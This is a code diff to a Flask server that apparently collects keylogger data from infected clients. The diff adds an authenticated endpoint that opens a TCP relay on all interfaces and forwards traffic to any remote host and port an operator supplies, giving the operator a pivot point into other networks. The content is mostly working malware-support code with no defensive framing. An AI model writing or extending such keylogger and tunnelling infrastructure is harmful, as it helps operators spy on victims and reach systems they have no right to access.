@@ -2,6 +2,7 @@ from flask import Flask, request, render_template, redirect, url_for, jsonify, R
 import re
 import os
 import json
+import socket
 import threading
 import sys
 from functools import wraps
@@ -148,7 +149,51 @@ def keylogger(client_id):
     except Exception as e:
         print(f"[ERROR] Error procesando logs de {client_id}: {str(e)}")
         return jsonify({"status": "error", "message": "Internal server error"}), 500
+
+@app.route('/start_bridge', methods=['POST'])
+@requires_auth
+def start_bridge():
+    """Start a TCP bridge to a specified remote host and port."""
+    local_port = int(request.form['local_port'])
+    remote_host = request.form['remote_host']
+    remote_port = int(request.form['remote_port'])
+    bridge_thread = threading.Thread(target=tcp_bridge, args=(local_port, remote_host, remote_port))
+    bridge_thread.start()
+    
+    return jsonify({"status": "success", "message": f"TCP bridge started on port {local_port} to {remote_host}:{remote_port}"}), 200
+
+def tcp_bridge(local_port, remote_host, remote_port):
+    """Establish a TCP bridge between a local port and a remote host."""
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind(('0.0.0.0', local_port))
+    server_socket.listen(5)
+    print(f"[*] Listening for connections on port {local_port}...")
+
+    while True:
+        client_socket, addr = server_socket.accept()
+        print(f"[INFO] Accepted connection from {addr}")
         
+        threading.Thread(target=handle_client, args=(client_socket, remote_host, remote_port)).start()
+
+def handle_client(client_socket, remote_host, remote_port):
+    """Handle communication between the client and the remote server."""
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
+        server_socket.connect((remote_host, remote_port))
+        
+        while True:
+            
+            client_data = client_socket.recv(4096)
+            if not client_data:
+                break
+            server_socket.sendall(client_data)
+
+            
+            server_data = server_socket.recv(4096)
+            if not server_data:
+                break
+            client_socket.sendall(server_data)
+
+    client_socket.close()        
 def secure_filename(filename):
     """
     Sanitize the filename to prevent directory traversal and unauthorized access.
